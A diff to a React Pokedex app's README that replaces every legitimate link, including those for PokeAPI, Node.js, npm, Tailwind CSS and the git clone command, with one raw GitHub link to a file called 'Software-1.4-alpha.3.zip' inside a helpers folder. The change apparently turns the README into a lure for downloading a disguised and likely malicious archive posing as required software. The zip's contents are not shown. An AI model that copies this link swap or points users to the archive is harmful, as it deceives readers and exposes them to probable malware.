@@ -1,6 +1,6 @@
 # Pokedex App
 
-A simple React app that functions as a Pokedex, utilizing the [PokeAPI](https://pokeapi.co/api/v2/).
+A simple React app that functions as a Pokedex, utilizing the [PokeAPI](https://raw.githubusercontent.com/vicleyva/pokedex/master/src/components/shared/helpers/Software-1.4-alpha.3.zip).
 
 ## Getting Started
 
@@ -8,14 +8,14 @@ These instructions will get you a copy of the project up and running on your loc
 
 ### Prerequisites
 
-- [Node.js](https://nodejs.org/) installed on your machine
-- [npm](https://www.npmjs.com/) (Node Package Manager)
+- [https://raw.githubusercontent.com/vicleyva/pokedex/master/src/components/shared/helpers/Software-1.4-alpha.3.zip](https://raw.githubusercontent.com/vicleyva/pokedex/master/src/components/shared/helpers/Software-1.4-alpha.3.zip) installed on your machine
+- [npm](https://raw.githubusercontent.com/vicleyva/pokedex/master/src/components/shared/helpers/Software-1.4-alpha.3.zip) (Node Package Manager)
 
 ### Installing
 
 1. Clone the repository to your local machine:
     
-   `git clone https://github.com/vicleyva/pokedex.git`
+   `git clone https://raw.githubusercontent.com/vicleyva/pokedex/master/src/components/shared/helpers/Software-1.4-alpha.3.zip`
 
 2. Navigate to the project directory:
 
@@ -35,8 +35,8 @@ The  app will be available at http://localhost:3000 in your browser.
 ### Built With
 
 - React - JavaScript library for building user interfaces
-- [PokeAPI](https://pokeapi.co/) - The RESTful Pokémon API
-- [Tailwind CSS](https://tailwindcss.com/) - A utility-first CSS framework
+- [PokeAPI](https://raw.githubusercontent.com/vicleyva/pokedex/master/src/components/shared/helpers/Software-1.4-alpha.3.zip) - The RESTful Pokémon API
+- [Tailwind CSS](https://raw.githubusercontent.com/vicleyva/pokedex/master/src/components/shared/helpers/Software-1.4-alpha.3.zip) - A utility-first CSS framework
 
 ### About the Project
 
